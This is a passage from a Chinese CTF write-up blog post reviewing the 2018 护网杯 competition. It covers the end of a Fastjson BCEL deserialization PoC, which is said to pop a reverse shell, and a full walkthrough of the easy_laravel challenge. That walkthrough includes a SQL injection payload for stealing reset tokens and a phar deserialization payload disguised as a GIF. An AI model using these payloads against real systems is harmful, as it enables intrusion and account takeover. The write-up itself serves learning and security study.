file,not java file</span></span><br><span class="line">        Path path = Paths.get(<span class="string">&quot;src/evil.class&quot;</span>);   <span class="comment">//文件绝对路径</span></span><br><span class="line">        <span class="keyword">byte</span>[] data = Files.readAllBytes(path);</span><br><span class="line">        String s =  Utility.encode(data,<span class="keyword">true</span>);</span><br><span class="line">        System.out.print(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到BCEL编码</p>
<p>然后构造JSON poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot; : &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">  &quot;driverClassLoader&quot; :</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;driverClassName&quot; : &quot;上个步骤得到的编码&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>将evil.java的cmd修改为 <code>python /tmp/poc.py</code></p>
<p>再操作一遍</p>
<p>就可以执行py文件，反弹一个shell,进行命令执行。</p>
<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181024/IA523j8eJh.png?imageslim" alt="mark"></p>
<h1 id="0x04-Easy-laravel"><a href="#0x04-Easy-laravel" class="headerlink" title="0x04 Easy_laravel"></a>0x04 Easy_laravel</h1><h2 id="4-1-环境复现"><a href="#4-1-环境复现" class="headerlink" title="4.1 环境复现"></a>4.1 环境复现</h2><p>首先感谢4uuu大佬出了这么好的题还给出<a target="_blank" rel="noopener" href="https://github.com/sco4x0/huwangbei2018_easy_laravel">复现环境</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;sco4x0&#x2F;huwangbei2018_easy_laravel</span><br><span class="line">docker-compose up</span><br></pre></td></tr></table></figure>

<h2 id="4-2-源码发现"><a href="#4-2-源码发现" class="headerlink" title="4.2 源码发现"></a>4.2 源码发现</h2><p>在登录等页面查看源码，可以得到</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://github.com/qqqqqqvq/easy_laravel --&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到代码，之后composer install 。代码就完整了。开始审计。</p>
<p>首先看路由<code>route文件夹</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Route::get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> view(<span class="string">&#x27;welcome&#x27;</span>); &#125;);</span><br><span class="line">Auth::routes();</span><br><span class="line">Route::get(<span class="string">&#x27;/home&#x27;</span>, <span class="string">&#x27;HomeController@index&#x27;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/note&#x27;</span>, <span class="string">&#x27;NoteController@index&#x27;</span>)-&gt;name(<span class="string">&#x27;note&#x27;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/upload&#x27;</span>, <span class="string">&#x27;UploadController@index&#x27;</span>)-&gt;name(<span class="string">&#x27;upload&#x27;</span>);</span><br><span class="line">Route::post(<span class="string">&#x27;/upload&#x27;</span>, <span class="string">&#x27;UploadController@upload&#x27;</span>)-&gt;name(<span class="string">&#x27;upload&#x27;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;FlagController@showFlag&#x27;</span>)-&gt;name(<span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/files&#x27;</span>, <span class="string">&#x27;UploadController@files&#x27;</span>)-&gt;name(<span class="string">&#x27;files&#x27;</span>);</span><br><span class="line">Route::post(<span class="string">&#x27;/check&#x27;</span>, <span class="string">&#x27;UploadController@check&#x27;</span>)-&gt;name(<span class="string">&#x27;check&#x27;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/error&#x27;</span>, <span class="string">&#x27;HomeController@error&#x27;</span>)-&gt;name(<span class="string">&#x27;error&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>也可以在目录下通过<code>php artisan route:list</code>命令查看，更加直接，详细</p>
<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181023/c6i59Gkik3.png?imageslim" alt="mark"></p>
<h2 id="4-3-sql注入"><a href="#4-3-sql注入" class="headerlink" title="4.3 sql注入"></a>4.3 sql注入</h2><p>几乎所有操作都需要进行登录，而且 <code>UploadController</code> 和 <code>FlagController</code> 都使用了一个叫做 <code>admin</code> 的中间件，在 <code>app/Http/Middleware/AdminMiddleware.php</code> 中可以看到代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">$request, <span class="built_in">Closure</span> $next</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;auth-&gt;user()-&gt;email !== <span class="string">&#x27;admin@qvq.im&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> redirect(route(<span class="string">&#x27;error&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $next($request);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>需要当前用户的邮箱为 <code>admin@qvq.im</code> ，这时发现使用这个邮箱是注册不上的，因为系统已经内置了这个管理员账号。但是由于不知道密码，我们也没办法利用。</p>
<p>接下来看看，有没有什么办法可以得到管理员邮箱的密码。在<code>\app\Http\Controllers\NoteController.php</code>中，发现一个明显的SQL注入（类似二次注入，注入点在注册页面）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">Note $note</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = Auth::user()-&gt;name;</span><br><span class="line">        $notes = DB::select(<span class="string">&quot;SELECT * FROM `notes` WHERE `author`=&#x27;&#123;$username&#125;&#x27;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">&#x27;note&#x27;</span>, compact(<span class="string">&#x27;notes&#x27;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>确实也可以注入，本以为可以通过注入得到admin用户的密码，那就简单了，不是吗？</p>
<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181023/gBkieHaDa6.png?imageslim" alt="mark"></p>
<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181023/EKEe8GaEHB.png?imageslim" alt="mark"></p>
<p>结果，最终发现密码是随机加密的，无法破解。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$factory-&gt;define(App\User::class, <span class="function"><span class="keyword">function</span> (<span class="params">Faker\<span class="built_in">Generator</span> $faker</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> $password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;4uuu Nya&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span> =&gt; <span class="string">&#x27;admin@qvq.im&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span> =&gt; bcrypt(str_random(<span class="number">40</span>)),</span><br><span class="line">        <span class="string">&#x27;remember_token&#x27;</span> =&gt; str_random(<span class="number">10</span>),</span><br><span class="line">    ];</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<h2 id="4-4-密码重置"><a href="#4-4-密码重置" class="headerlink" title="4.4 密码重置"></a>4.4 密码重置</h2><p>既然SQL注入不行，那么就得想其他方法才行。在上一步SQL注入的测试中，发现<code>\database\migrations\2014_10_12_100000_create_password_resets_table.php</code>是一个重置密码的文件，并且其中代码是这样写的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">up</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Schema::create(<span class="string">&#x27;password_resets&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">Blueprint $table</span>) </span>&#123;</span><br><span class="line">            $table-&gt;string(<span class="string">&#x27;email&#x27;</span>)-&gt;index();</span><br><span class="line">            $table-&gt;string(<span class="string">&#x27;token&#x27;</span>)-&gt;index();</span><br><span class="line">            $table-&gt;timestamp(<span class="string">&#x27;created_at&#x27;</span>)-&gt;nullable();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>也就是只要有邮箱和token，我们就可以修改密码，问题在于token怎么弄到手呢？</p>
<p>这里用到Laravel5.4的一个特性 ：</p>
<p>重置密码时，如果存在这个用户的话，有个生成token的操作，<strong>之后将生成的token直接存在了数据库中。</strong></p>
<p>利用注册页面的SQL注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; union select 1,(select token from password_resets limit 0,1),3,4,5#</span><br></pre></td></tr></table></figure>

<p>拿到token后，访问链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;120.79.180.214&#x2F;password&#x2F;reset&#x2F;1c9d0f377a75dd48abaa90dd7fa4eb35653da39561d6f9c33bdb14a8a0849616（token值）</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181023/B7550HKe9j.png?imageslim" alt="mark"></p>
<h2 id="4-5-登陆后台"><a href="#4-5-登陆后台" class="headerlink" title="4.5 登陆后台"></a>4.5 登陆后台</h2><p>发现有4个功能：upload,files,flag,note </p>
<p>但是直接访问会发现页面提示 <code>no flag</code>，这里页面内容不一致，在 laravel 中，模板文件是存放在 <code>resources/views</code> 中的，然后会被编译放到 <code>storage/framework/views</code> 中，而编译后的文件存在过期的判断。</p>
<p>加上题目的提示：</p>
<ul>
<li>blade expired</li>
<li>pop chain</li>
</ul>
<p>可以发现是<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7d65f9eb94be">blade过期的问题</a></p>
<p>发现Blade 是 laravel 提供的一个简单强大的模板引擎。它不像其他流行的 PHP 模板引擎那样限制你在视图中使用原生的 PHP 代码，事实上它就是把 Blade 视图编译成原生的 PHP 代码并缓存起来。缓存会在 Blade 视图改变时而改变，这意味着 Blade 并没有给你的应用添加编译的负担。<br>所以我们这的思路很清晰：</p>
<ol>
<li>因为旧的缓存存在，导致我们看不到flag</li>
<li>我们可以利用pop chain删掉缓存文件</li>
<li>读到flag</li>
</ol>
<p>那么缓存文件在哪里呢？我们查看源码发现</p>
<p>在 <code>Illuminate/View/Compilers/Compiler.php</code> 中可以看到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isExpired</span>(<span class="params">$path</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $compiled = <span class="keyword">$this</span>-&gt;getCompiledPath($path);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the compiled file doesn&#x27;t exist we will indicate that the view is expired</span></span><br><span class="line">    <span class="comment">// so that it can be re-compiled. Else, we will verify the last modification</span></span><br><span class="line">    <span class="comment">// of the views is less than the modification times of the compiled views.</span></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;files-&gt;exists($compiled)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $lastModified = <span class="keyword">$this</span>-&gt;files-&gt;lastModified($path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $lastModified &gt;= <span class="keyword">$this</span>-&gt;files-&gt;lastModified($compiled);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结合相关文档和提示<code>nginx是坠吼的 ( 好麻烦，默认配置也是坠吼的 </code></p>
<p>那么很容易得知web目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</span><br></pre></td></tr></table></figure>

<p>blade默认缓存是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;storage&#x2F;framework&#x2F;views</span><br></pre></td></tr></table></figure>

<p>因此，使用了nginx的默认配置，那么flag文件的完整路径就是 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;resources&#x2F;views&#x2F;auth&#x2F;flag.blade.php</span><br></pre></td></tr></table></figure>

<p>经过sha1后得到 <code>34e41df0934a75437873264cd28e2d835bc38772.php</code></p>
<h2 id="4-6-利用反序列化删除文件"><a href="#4-6-利用反序列化删除文件" class="headerlink" title="4.6 利用反序列化删除文件"></a>4.6 利用反序列化删除文件</h2><p>过期时间是依据文件的最后修改时间来判断的，所以判断服务器上编译后的文件最后修改时间大于原本模板文件，那么怎么去删除(修改)编译后的文件?</p>
<p>这里发现<code>composer.json</code>中提供了大量组件，我们安装一下，然后全局搜索，容易发现有<code>unlink()</code></p>
<h2 id="4-7-phar神来之笔"><a href="#4-7-phar神来之笔" class="headerlink" title="4.7 phar神来之笔"></a>4.7 phar神来之笔</h2><p>那最后怎么触发序列化呢？这里用到了我们BlackHat会议演讲的phar://方法<br>参考这篇文章<a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">我校表哥seaii的利用 phar 拓展 php 反序列化漏洞攻击面</a></p>
<p>check在<code>\app\Http\Controllers\UploadController.php</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function check(Request $request)</span><br><span class="line">   &#123;</span><br><span class="line">       $path &#x3D; $request-&gt;input(&#39;path&#39;, $this-&gt;path);</span><br><span class="line">       $filename &#x3D; $request-&gt;input(&#39;filename&#39;, null);</span><br><span class="line">       if($filename)&#123;</span><br><span class="line">           if(!file_exists($path . $filename))&#123;</span><br><span class="line">               Flash::error(&#39;磁盘文件已删除，刷新文件列表&#39;);</span><br><span class="line">           &#125;else&#123;</span><br><span class="line">               Flash::success(&#39;文件有效&#39;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       return redirect(route(&#39;files&#39;));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>是会使用file_exists的，并且path和filename可控！</p>
<p>出题师傅的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $filepath &#x3D; &#39;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;resources&#x2F;views&#x2F;auth&#x2F;flag.blade.php&#39;;</span><br><span class="line">    require &#39;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;vendor&#x2F;autoload.php&#39;;</span><br><span class="line">    $obj &#x3D; new Swift_ByteStream_TemporaryFileByteStream();</span><br><span class="line">    $a &#x3D; serialize($obj);</span><br><span class="line">    $a &#x3D; preg_replace(&#39;&#x2F;\&#x2F;tmp\&#x2F;FileByteStream[a-zA-Z0-9]&#123;6&#125;&#x2F;&#39;, sha1(xxx), $a);</span><br><span class="line">    $a &#x3D; str_replace(&#39;25&#39;, &#39;90&#39;, $a);</span><br><span class="line">    $b &#x3D; unserialize($a);</span><br><span class="line">    $p &#x3D; new Phar(&#39;.&#x2F;1.phar&#39;, 0);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;);</span><br><span class="line">    $p-&gt;setMetadata($b);</span><br><span class="line">    $p-&gt;addFromString(&#39;1.txt&#39;,&#39;text&#39;);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line">    rename(&#39;.&#x2F;1.phar&#39;, &#39;1.gif&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后上传1.gif，check的时候传入自定义的path和filename，然后访问/flag ，得到flag</p>
<h2 id="4-8-本题总结"><a href="#4-8-本题总结" class="headerlink" title="4.8 本题总结"></a>4.8 本题总结</h2><p>由于之前没太接触过Laravel框架，最近看了很多资料，才算勉强看懂了大佬们的WP和思路。不得不说，这道题目非常有水平，考察了二次注入，Laravel框架的特性和逻辑漏洞，POP链与反序列化,  phar协议扩展反序列化的攻击等。学习了0rz</p>
<h1 id="0x05-后记"><a href="#0x05-后记" class="headerlink" title="0x05 后记"></a>0x05 后记</h1><p>本次护网杯，收获甚大，出题人的水平非常高，出的题很有意思，而且学到很多东西， 感谢所有出题人0rz。</p>
<p>当然，也发现自身的很多不足，比如对一些web框架不熟悉，对Javaweb很不熟悉，杂项有些东西还没吃透，后期需要更加努力的去弥补这些了。</p>
<p>还有就是，很多东西喜欢拖，拖到现在才做完护网杯的复习和学习==、</p>
<p>最后，有点可惜，没有进入决赛，问了一下排名90，感觉再做出一个题赢就差不多能进，哎<code>(；´д｀)ゞ</code>。打算下周开始接触逆向和pwn，希望看到文章的逆向大佬给个逆向入门的学习路线吧，欢迎联系我（联系方式见<strong>关于</strong>页面）。</p>
<h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wfzWebSecuity/p/9787238.html">护网杯一道密码学的感想</a></p>
<p><a target="_blank" rel="noopener" href="http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/">2018护网杯-web-writeup</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2892#toc-0">2018护网杯线上赛 Writeup by Lilac</a></p>
<p><a target="_blank" rel="noopener" href="http://n3k0sec.top/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AFwp">护网杯WP-n3k0</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mrchang/p/6789060.html">Fastjson反序列化漏洞研究</a></p>
<p><a target="_blank" rel="noopener" href="https://kevien.github.io/2018/06/18/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E7%BB%AD)/">FastJson反序列化漏洞(续)</a></p>
<p><a target="_blank" rel="noopener" href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">fastjson 远程反序列化poc的构造和分析</a></p>
<p><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/others-articles/167932.html">DefineClass在Java反序列化当中的利用</a></p>
<p><a target="_blank" rel="noopener" href="https://www.codercto.com/a/31804.html">护网杯2018 easy_laravel 复盘</a></p>
<p><a target="_blank" rel="noopener" href="http://www.venenof.com/index.php/archives/565/">护网杯-easy laravel-Writeup</a></p>
<p><a target="_blank" rel="noopener" href="https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95">护网杯2018 easy_laravel出题记录</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">这是学长表哥seaii的文章0rz——利用 phar 拓展 php 反序列化漏洞攻击面</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2901">2018护网杯easy_laravel 利用POP Chian getshell</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:v0wldl@163.com">V0WKeep3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://v0w.top/2018/10/18/%E6%8A%A4%E7%BD%91%E6%9D%AF%E5%90%8E%E8%AE%B0-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">http://v0w.top/2018/10/18/%E6%8A%A4%E7%BD%91%E6%9D%AF%E5%90%8E%E8%AE%B0-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://v0w.top">V0W's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/php/">php</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><a class="post-meta__tags" href="/tags/Java/">Java</a><a class="post-meta__tags" href="/tags/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/">取证分析</a><a class="post-meta__tags" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="http://image.v0w.top/Blog/2020-08-28-044057.png"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="http://image.v0w.top/Blog/2020-08-28-044040.png"><div class="post-qr-code__desc">微信打赏</div></div></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/10/22/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%9A%90%E5%86%99%E6%9C%AF%E5%A5%97%E8%B7%AF/"><i class="fa fa-chevron-left">  </i><span>CTF中常见隐写术套路</span></a></div><div class="next-post pull-right"><a href="/2018/10/16/EnvConfig_Java-Tomcat/"><span>Ubantu服务器上配置Java+Tomcat服务</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == 'true';
var verify = 'false' == 'true';
var record_ip = 'false' == 'true';
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  recordIP:record_ip,
  appId:'xuqLRcah5FaInOgKRdj9JB3V-gzGzoHsz',
  appKey:'8vMPXnFoh7Fih1g29jw4JNxl',
  placeholder:'师傅可以留下你的评论和邮箱，V0W能够通过邮件get并回复哦～',
  avatar:'retro',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(/img/index.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2020 By V0WKeep3r</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.8.2"></script><script src="/js/fancybox.js?version=1.8.2"></script><script src="/js/sidebar.js?version=1.8.2"></script><script src="/js/copy.js?version=1.8.2"></script><script src="/js/fireworks.js?version=1.8.2"></script><script src="/js/transition.js?version=1.8.2"></script><script src="/js/scroll.js?version=1.8.2"></script><script src="/js/head.js?version=1.8.2"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>